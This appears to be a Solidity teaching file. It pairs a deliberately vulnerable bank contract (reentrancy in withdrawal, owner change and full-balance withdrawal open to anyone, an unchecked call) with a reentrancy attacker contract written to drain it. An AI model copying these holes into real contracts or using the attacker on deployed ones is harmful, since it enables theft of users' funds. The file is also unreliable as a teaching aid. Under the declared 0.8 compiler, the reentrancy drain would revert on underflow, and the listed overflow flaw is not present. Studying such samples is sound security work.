// Example Vulnerable Contract for Testing
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title VulnerableBank - Example contract with intentional vulnerabilities
 * @dev This contract contains common smart contract vulnerabilities for testing
 * WARNING: This is for educational/testing purposes only - DO NOT use in production!
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    address public owner;
    bool private locked;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    modifier noReentrancy() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    // VULNERABILITY 1: Reentrancy (Classic)
    function withdrawVulnerable(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // External call before state change - VULNERABLE!
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= _amount; // State change after external call
        emit Withdrawal(msg.sender, _amount);
    }
    
    // SAFE VERSION: State change before external call
    function withdrawSafe(uint256 _amount) external noReentrancy {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount; // State change first
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, _amount);
    }
    
    // VULNERABILITY 2: Integer Overflow (if using older Solidity)
    function depositUnchecked(uint256 _amount) external payable {
        require(msg.value == _amount, "Value mismatch");
        
        // In Solidity < 0.8.0, this could overflow
        balances[msg.sender] += _amount;
        emit Deposit(msg.sender, _amount);
    }
    
    // VULNERABILITY 3: Access Control Issue
    function emergencyWithdraw() external {
        // Missing onlyOwner modifier - anyone can call!
        uint256 balance = address(this).balance;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    // SAFE VERSION
    function emergencyWithdrawSafe() external onlyOwner {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    // VULNERABILITY 4: Unchecked External Call
    function transferTo(address _to, uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        
        // Unchecked external call - could fail silently
        _to.call{value: _amount}("");
        
        emit Withdrawal(msg.sender, _amount);
    }
    
    // VULNERABILITY 5: Weak Access Control
    function changeOwner(address _newOwner) external {
        // Should have onlyOwner modifier!
        owner = _newOwner;
    }
    
    // Standard deposit function
    function deposit() external payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // View functions
    function getBalance(address _user) external view returns (uint256) {
        return balances[_user];
    }
    
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancyAttacker - Example attack contract
 * @dev Demonstrates reentrancy attack on VulnerableBank
 */
contract ReentrancyAttacker {
    VulnerableBank public bank;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        // Deposit first
        bank.deposit{value: msg.value}();
        
        // Start the attack
        bank.withdrawVulnerable(msg.value);
    }
    
    // This function will be called during the reentrancy
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawVulnerable(1 ether);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
